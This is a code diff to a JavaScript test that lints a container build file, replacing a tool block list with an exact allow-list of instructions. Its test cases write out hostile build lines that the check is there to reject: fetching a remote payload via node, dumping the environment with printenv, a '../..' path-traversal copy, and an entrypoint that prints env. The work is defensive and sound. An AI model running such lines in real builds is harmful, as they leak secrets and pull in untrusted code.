@@ -59,6 +59,20 @@ function importClosure(entry) {
 
 const SERVICE_NAMES = new Set(Object.values(SERVICE_VARIABLES).flat());
 
+/**
+ * Every instruction after the gate, verbatim (continuations joined). It copies
+ * the observer directory, writes a package.json, adds a user, drops to it and
+ * names the supervisor -- nothing that installs, fetches or records the
+ * environment.
+ */
+const EXPECTED_AFTER_GATE = Object.freeze([
+  "COPY scripts/ops-observer/ scripts/ops-observer/",
+  `RUN printf '{"private":true,"type":"module"}\\n' > package.json && addgroup -S observer && adduser -S -G observer -h /home/observer observer`,
+  "USER observer",
+  "ENV NODE_ENV=production",
+  'ENTRYPOINT ["node", "scripts/ops-observer/supervise.mjs"]',
+]);
+
 /** Every rule this file is held to; returns the broken rules. */
 function problems(text) {
   const found = [];
@@ -104,20 +118,12 @@ function problems(text) {
   }
   if ([...allowed].some((path) => !copiedPaths.has(path))) found.push("gate_closure_incomplete");
 
-  // After the gate: only the observer modules are copied, and nothing installs
-  // or fetches anything.
-  for (const instruction of instructions.slice(firstExecuting + 1)) {
-    if (instruction.keyword === "ADD") found.push("after_gate_copy");
-    if (instruction.keyword === "COPY") {
-      const [source, destination, ...rest] = instruction.args.split(" ");
-      if (rest.length > 0 || source !== destination || !source.startsWith("scripts/ops-observer/")) {
-        found.push("after_gate_copy");
-      }
-    }
-    if (instruction.keyword === "RUN" && /\b(?:npm|npx|yarn|pnpm|corepack|apk|apt|apt-get|pip|curl|wget|git)\b/.test(instruction.args)) {
-      found.push("after_gate_install");
-    }
-  }
+  // After the gate: exactly the reviewed instructions, compared whole. A list
+  // of forbidden tools or a path prefix can always be walked around (`node -e`,
+  // `printenv >`, `scripts/ops-observer/../..`); an exact list cannot, and any
+  // change to the image becomes a change to this list, reviewed with it.
+  const afterGate = instructions.slice(firstExecuting + 1).map((i) => `${i.keyword} ${i.args}`);
+  if (JSON.stringify(afterGate) !== JSON.stringify(EXPECTED_AFTER_GATE)) found.push("after_gate");
   return [...new Set(found)];
 }
 
@@ -143,10 +149,17 @@ test("each rule catches its own violation", () => {
     ["env_secret", variant("ENV NODE_ENV=production", "ENV DATABASE_URL postgres://x")],
     ["env_secret", variant("ENV NODE_ENV=production", "ENV OPS_OBSERVER_SECRET some value")],
     ["single_stage", variant("USER observer", "ADD --from=alpine:3 /etc/hosts /etc/hosts\nUSER observer")],
-    ["after_gate_copy", variant("USER observer", "COPY . .\nUSER observer")],
-    ["after_gate_copy", variant("USER observer", "ADD https://example.com/x /x\nUSER observer")],
-    ["after_gate_install", variant("USER observer", "RUN npm install\nUSER observer")],
-    ["after_gate_install", variant("USER observer", "RUN apk add --no-cache curl\nUSER observer")],
+    ["after_gate", variant("USER observer", "COPY . .\nUSER observer")],
+    ["after_gate", variant("USER observer", "ADD https://example.com/x /x\nUSER observer")],
+    ["after_gate", variant("USER observer", "RUN npm install\nUSER observer")],
+    ["after_gate", variant("USER observer", "RUN apk add --no-cache curl\nUSER observer")],
+    ["after_gate", variant("USER observer", `RUN node -e "fetch('https://example.com/payload')"\nUSER observer`)],
+    ["after_gate", variant("USER observer", "RUN printenv > /environment.txt\nUSER observer")],
+    [
+      "after_gate",
+      variant("COPY scripts/ops-observer/ scripts/ops-observer/", "COPY scripts/ops-observer/../../app/ scripts/ops-observer/../../app/"),
+    ],
+    ["after_gate", variant('ENTRYPOINT ["node", "scripts/ops-observer/supervise.mjs"]', 'ENTRYPOINT ["sh", "-c", "env"]')],
     ["gate_first", variant("WORKDIR /observer", "WORKDIR /observer\nRUN echo before")],
     ["gate_first", variant(gateLine, "RUN node scripts/ops-observer/build-env-gate.mjs || true")],
     ["copied_before_gate", variant(gateLine, `COPY package.json package.json\n${gateLine}`)],
